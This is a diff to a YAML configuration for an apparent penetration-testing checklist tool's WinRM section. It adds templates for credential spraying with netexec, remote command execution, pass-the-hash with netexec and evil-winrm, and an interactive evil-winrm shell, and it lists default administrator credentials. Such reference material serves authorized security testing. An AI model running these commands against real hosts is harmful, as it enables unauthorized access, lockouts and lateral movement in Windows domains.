@@ -17,13 +17,25 @@ checks:
     label: "Tested discovered credentials"
   - key: winrm-shell-access
     label: "Obtained interactive shell via evil-winrm"
+  - key: winrm-password-spray
+    label: "Sprayed credentials with netexec across the AD population"
+  - key: winrm-pth
+    label: "Tested pass-the-hash (no plaintext password needed)"
 commands:
   - label: "nmap WinRM"
     template: "nmap -p{PORT} --script=http-wsdiscover,http-wsman {IP}"
-  - label: "crackmapexec WinRM spray"
+  - label: "crackmapexec WinRM spray (legacy)"
     template: "crackmapexec winrm {IP} -u users.txt -p passwords.txt"
-  - label: "evil-winrm shell"
+  - label: "netexec / nxc WinRM spray"
+    template: "nxc winrm {IP} -u users.txt -p passwords.txt --continue-on-success"
+  - label: "netexec WinRM exec (one-off command)"
+    template: "nxc winrm {IP} -u <user> -p <pass> -x 'whoami /all'"
+  - label: "netexec WinRM pass-the-hash"
+    template: "nxc winrm {IP} -u <user> -H <NT-hash>"
+  - label: "evil-winrm interactive shell"
     template: "evil-winrm -i {IP} -u administrator -p 'password'"
+  - label: "evil-winrm pass-the-hash"
+    template: "evil-winrm -i {IP} -u administrator -H <NT-hash>"
 default_creds:
   - username: administrator
     password: administrator
